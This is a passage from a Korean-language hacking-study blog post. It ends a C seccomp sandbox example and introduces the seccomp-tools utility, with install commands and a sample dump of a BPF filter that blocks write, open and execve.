    perror(&#34;Seccomp filter error\n&#34;);
    return -1;
  }
  return 0;
}
int main(int argc, char* argv[]) {
  char buf[256];
  int fd;
  memset(buf, 0, sizeof(buf));
  sandbox();
  fd = open(&#34;/bin/sh&#34;, O_RDONLY);
  read(fd, buf, sizeof(buf) - 1);
  write(1, buf, sizeof(buf));
  return 0;
}
</code></pre></li></ul></li></ul></li></ul><h5 id=seccomp-tools>seccomp-tools<a hidden class=anchor aria-hidden=true href=#seccomp-tools>#</a></h5><ul><li>SECCOMP 및 BPF가 적용된 코드를 분석하기 쉽게 하는 도구</li><li>설치방법:<pre tabindex=0><code>sudo apt install gcc ruby-dev
sudo gem install seccomp-tools
</code></pre></li><li><a href=https://github.com/david942j/seccomp-tools>seccomp-tools git 주소</a></li><li>사용방법<ul><li><code>seccomp-tools dump FILE_NAME</code> : FILE_NAME 에 대한 seccomp 분석 결과 확인<ul><li>예시<pre tabindex=0><code> line  CODE  JT   JF      K
 =================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0010
 0006: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0010
 0007: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0010
 0008: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre></li></ul></li></ul></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://aswinblue.github.io/Blog/tags/c/>c</a></li><li><a href=https://aswinblue.github.io/Blog/tags/hacking/>hacking</a></li><li><a href=https://aswinblue.github.io/Blog/tags/assembly/>assembly</a></li></ul><nav class=paginav><a class=prev href=https://aswinblue.github.io/Blog/post/systemhacking/reverse_engineering/><span class=title>« Prev</span><br><span>Reverse Engineering</span></a>
<a class=next href=https://aswinblue.github.io/Blog/post/systemhacking/pwntool/><span class=title>Next »</span><br><span>Pwntool</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on twitter" href="https://twitter.com/intent/tweet/?text=Exploit&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f&amp;hashtags=C%2chacking%2cassembly"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f&amp;title=Exploit&amp;summary=Exploit&amp;source=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on reddit" href="https://reddit.com/submit?url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f&title=Exploit"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on whatsapp" href="https://api.whatsapp.com/send?text=Exploit%20-%20https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on telegram" href="https://telegram.me/share/url?text=Exploit&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fsystemhacking%2fexploit%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><div class=auto-hide-div><ins class=kakao_ad_area style=display:none;position:fixed data-ad-unit=DAN-17Lk24lxFVgxtePU data-ad-width=160 data-ad-height=auto></ins></div><script type=text/javascript src=//t1.daumcdn.net/kas/static/ba.min.js async></script></div><footer class=footer><span>&copy; 2024 <a href=https://aswinblue.github.io/Blog>AswinBlue</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>